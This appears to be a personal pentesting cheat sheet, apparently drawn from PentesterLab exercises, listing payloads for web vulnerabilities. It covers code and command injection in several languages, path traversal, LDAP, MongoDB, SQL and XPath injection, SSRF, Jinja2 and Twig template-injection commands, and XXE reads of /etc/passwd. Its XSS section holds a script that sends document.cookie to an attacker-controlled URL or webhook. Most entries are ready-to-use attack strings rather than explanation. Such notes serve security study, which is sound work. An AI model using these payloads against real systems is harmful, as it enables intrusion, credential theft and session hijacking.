# Essential notes

### Authentication

* the comparison of the existence of user when you create a new user is done programmatically (i.e.: in Ruby) but when the user's details get retrieved, the comparison is  done by the database. 

  1. By default, MySQL (with the type `VARCHAR`) will perform a case insensitive comparison: "admin" and "Admin" are the same value.
  2. MySQL ignores trailing spaces (i.e.: `pentesterlab` and `pentesterlab[space]` are equals)

  Using that information, you should be able to create a user that will be identified as `admin`.

### Authorization

* In modern frameworks most of the code is generated automatically and access to different  formats (HTML, JSON) for the same database record is also done  automatically.

  for example in url `/users/1`. Json data can be obtained using 

  `/users/1.json`   or   `/users/1?format=json`

  ##### ORM

* for example the format of the web application uses `user[username]` and `user[password]` for access 

  but this **user ** object has an attribute **admin** too.

  which can be accessed using `user[admin]` , it we can use it in place of `user[username]`using intercept.

  ##### Mass-assignment attack

* for example, by convention when a developer uses ActiveRecord (ruby on rails), if a class **Organisation** is handling multiple users then its id field by default is **organisation_id** 

  so again `user[username]` can be replaced by `user[organisation_id]`

### Code Execution

##### 1. PHP

* strings can be concatenated using `"ha"."cker"`which means `hacker` 

  to run a command `system('uname -a');` 

  so if there is a paramenter `?name=hacker` we can execute using `?name=hacker".system('uname -a');"` or `?name=hacker".system('uname -a');//`

  we can use **//** or **#** to comment out everything after. 

* **usort()** fucntion sorts the data in PHP

  so when there is parameter `?order=id` we can inject our code using `?order=id);}system('uname -a');//`

##### 2. Ruby

* strings can be concatenated using `"ha"+"cker"`which means `hacker` 

  to run a command `` `uname -a`  `` 

  so if there is a parameter `?name=hacker` we can execute using ``?name=hacker"+`uname -a`+"``  make sure to replace    **+** with **%2b** in url encoding.

##### 3. Python

* to run a command `os.system('id')`  or if you want output as string format `os.popen('id').read()` 

  as os.popen() is deprecated in python 2.6 you should use subprocess.Popen()

  so we can execute it using `?name=hacker"+str(os.popen('id').read())+"`

  NOTE: condition provided that they have imported os module in the backend

* if os module is not imported by them we can import and execute it using

  `__import__('os').system('id')` 

* Now the condition is  **/**  can't be used else the application with consider it as path of a url.

  so, we will base64 encode the part where **/** is used

  `__import__('os').popen(__import__('base64').b64decode('encodedstring')).read()`

  convert `cat /etc/passwd` to `encodedstring`

##### 4. Perl

* strings can be concatenated using `'ha'.'cker'`which means `hacker` 

  to run a command `` `uname -a` `` 

  so if there is a parameter `?name=hacker` we can execute using ``?name=hacker'.`uname -a`'``

### Command Execution

* The **backtick** `` `...` ``  or `$(...)` is actually called command substitution. The purpose of command  substitution is to evaluate the command which is placed inside the **backtick** or **$(...)**  and provide its result as an argument to the actual command.

  example:  ``ping `uname -a` ``  or `ping $(uname -a)`

### Directory Traversal

* if there is a url `?file=/hacker` which opens an image that means there is a server side code with adds extensions like .jpeg or .png to our file name hacker

  so if we execute `?file=/../../../etc/passwd` then to bypass that addition of suffix we will add a **null byte character** to our url which will not read any suffix added after it

  `?file=/../../../../etc/passwd%00` 

### File Inclusion

* The `?` marks the *beginning* of the query string, the `&` is used to separate individual variables *within* the query string.

* part of a file name in a call to an including function (`require`, `require_once`, `include` or `include_once` in PHP for example)

  to check which function is being called add   '  in a paramenter page example `?page=intro.php'`

* if there is an addition of suffix in server side code then,

  we can get rid of the suffix (for LFI) using a NULL BYTE. For RFI, you can get rid of the suffix, by adding `&blah=` or `?blah=` depending on your URL.

### LDAP

* some LDAP servers authorise NULL Bind: if null values are sent,

  If you keep something like `username=&password=` in the URL, these values will not work, since they won't be null; instead, they will be empty.

  so replace `username=&password=` with `1` in burpsuite intercept

  NOTE: This is an important check even if the backend is not LDAP based

##### Basic Syntax

* When you are retrieving a user, based on its username, the following will be used:

  ```
  (cn=[INPUT])
  ```

* A boolean OR using `|`:

  ```
  (|(cn=[INPUT1])(cn=[INPUT2]))
  ```

  to get records matching `[INPUT1]` or `[INPUT2]`

* A boolean AND using `&`:

  ```
  (&(cn=[INPUT1])(userPassword=[INPUT2]))
  ```

  to get records for which the `cn` matches `[INPUT1]` and the password matches `[INPUT2]`

* LDAP uses the wildcard * character very often, to match any values (for example, `adm*` for all words starting with `adm`)

* EXAMPLE:

  * `username=hacker&password=hacker` we get authenticated (this is the normal request).
  * `username=hack*&password=hacker` we get authenticated (the wildcard matches the same value).
  * `username=hacker&password=hac*` we don't get authenticated (the password may likely be hashed).

  based on the above request we can deduce that the filter probably looks like

  ```
  (&(cn=[INPUT1])(userPassword=HASH[INPUT2]))
  ```

  TO attack this example we will send this request

  `username=admin)(cn=*))%00&password=abcd`

  it will make the code:

  ```
  (&(cn=admin)(cn=*))%00(userPassword=admin))
  ```

  cn=* to fulfil the **&** condition

  NULL BYTE to get rid of anything after

### MongoDB Injection

* will need two things to bypass this login for:

  - An always true condition.
  - A way to correctly terminate the NoSQL query.

* SQL `or 1=1` translates to `|| 1==1`

* NULL BYTE will prevent MongoDB from using the rest of the query

  comments `//` or `<!--` to comment out the end of the query

* EXAMPLE:

  `username=admin&password=admin`

  we got an error when using `admin'` as username

  so injection will be like 

  `username=admin' || 1==1%00&password=admin`

##### Basic Syntax

* in url `/?search=admin` we can deduce that there is probably a `password` field.

  * if we access:

    ```
    /?search=admin'%20%26%26%20this.password.match(/.*/)%00
    ```

     we can see a result.

  * if we access:

    ```
    /?search=admin'%20%26%26%20this.password.match(/zzzzz/)%00
    ```

    we cannot see a result.

  * if we access:

    ```
     /?search=admin'%20%26%26%20this.passwordzz.match(/.*/)%00
    ```

    we get an error message (since the field `passwordzz` does not exist).

* The algorithm for regex matching looks like:

  * test if password match `/^a.$/` it will return true if password starts with 'a' of if it return false then move to the next letter. i.e, `/^b.$/`

* EXAMPLE lets say password is 'aab':

  * `/^a.*$/` that will return true.
  * `/^a$/` that will return false.
  * `/^aa.*$/` that will return true.
  * `/^aa$/` that will return false.
  * `/^aaa.*$/` that will return false.
  * `/^aab.*$/` that will return true.
  * `/^aab$/` that will return true. The password has been found.

### Open Redirect

* If the redirect URL needs to start with `/` in `/redirect.php?uri=/`

  then we can use `//` to bypass this because if we do `/redirect.php?uri=//www.google.com` then if the host site is http or https then it will automatically add `http:`  or `https:` in the starting of `//www.google.com` to it respectively.

### SQL Injecton(MySQL)

* if sql query is like:

  ```mysql
  SELECT * FROM user WHERE login='[USER]' and password='[PASSWORD]';
  ```

  where [USER] and [PASSWORD] are the values to be submitted

  To Bypass this:   we will input user as `' OR 1=1 # ` or `' OR 1=1 -- `  to make the query as

  ```mysql
  SELECT * FROM user WHERE login='' OR 1=1 # ' and password='[PASSWORD]';
  ```

* if there is a condition that **only one** result is return by the database, then we will **limit** the result to only one instead of all

  `' OR 1=1 LIMIT 1 -- `

* if there is a condition that **spaces** can't be used we will use **tabulation** in encoded form:

  `'%09OR%091=1%09#%09`

  or just `'||1=1#`

* CTF STUFF:

  the charachter encoding is set to 'GBK' which escapes `'` or `"` 

  to bypass this we use string `\xBF'` which is url encoded to `%bf%27` in place of `'`

### SSRF

* when we are resricted to access any internal file of a system which is running on its localhost we will make our vulnerable application to do it

  let's say we need to view content on port 1234 of its localhost then if we have a parameter like `/?url=` then we can do

  `/?url=http://127.0.0.1:1234`

  we can use `127.0.0.1` or `localhost` or `0.0.0.0` 

* we are given that `abcd.hackingwithpentesterlab.link` always respond with `127.0.0.1` we can check using

  ```bash
  dig abcd.hackingwithpentesterlab.link
  ```

  so in url 

  `/?url=https://assets.pentesterlab.com/hacker.txt` it is neccesary to include 'assets.pentesterlab.com' so we can use

  `/?url=http://assets.pentesterlab.com.hackingwithpentesterlab.link:1234/`

  NOTE: http in place of https

### SSTI

##### Jinja2

* if the website uses `jinja2` template injection, then we can execute following payload to get access to any class:

  ```jinja2
  {{''.__class__.mro()[1].__subclasses__()[X](COMMAND)}}
  ```

  'X' is the number of that class

  

  we can use the above payload to get access to `<class 'subprocess.Popen'>`
  
  IN PYTHON2:
  
  ```jinja2
  {{''.__class__.mro()[2].__subclasses__()[233]('uname -a',shell=True,stdout=-1).communicate()[0]}}
  ```

##### Twig 1.9 (old version)

* if website uses `twig`

  ```twig
  {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('uname')}}
  ```

### XML Attacks

* to read any file in xml:

  ```xml
  <!DOCTYPE test [
      <!ENTITY x SYSTEM "file:///etc/passwd">]>
  ```

  so it will save all of the file content in variable x

* let say we have parameter `?xml=<test>hacker</test>`, in which 'hacker' is being reflected in website

  so we can use:

  ```xml
  ?xml=<!DOCTYPE test [<!ENTITY x SYSTEM "file:///etc/passwd">]><test>%26x;</test>
  ```

  %26x; means `&x;` which means to use the reference to x

* xml has xpath expression. imagine XML as a database, and XPATH as an SQL query.

  syntax of XPATH injection:

  - `' and '1'='1` and you should get the same result.
  - `' or '1'='0` and you should get the same result.
  - `' and '1'='0` and you should not get any result.
  - `' or '1'='1` and you should get all results.

* `hacker' or 1=1]%00` to see all the results. NULL BYTE to comment out rest of the things.

* EXAMPLE:

  * to display **child of current node** :

    `' or 1=1]/child::node()%00`

    OUTPUT: `hacker` and `admin` 

    (lists the users)

  * to display **all the child nodes** :

    `hacker' or 1=1]/parent::*/child::node()%00`

    OUTPUT: (lists the users content and password)

  * if the node's name is **password** then to look at **child nodes of password** :

    `hacker']/parent::*/password%00` 

    OUTPUT: (lists the passwords of all users)

### XSS

* `eval()` function if `alert()` is blocked

  `<script>eval("ale"+"rt(1)")</script>`

  encode + as %2b

* we can also do `/index.php/abcd` any page and see its reflection in 404 page

* to steal `cookie`

  ```
  <script>
  document.write('<img src="[URL]?c='+document.cookie+'" />');
  </script>
  ```

  [URL] is the url of your webserver or webhook.site

  encode '+' as '%2b'

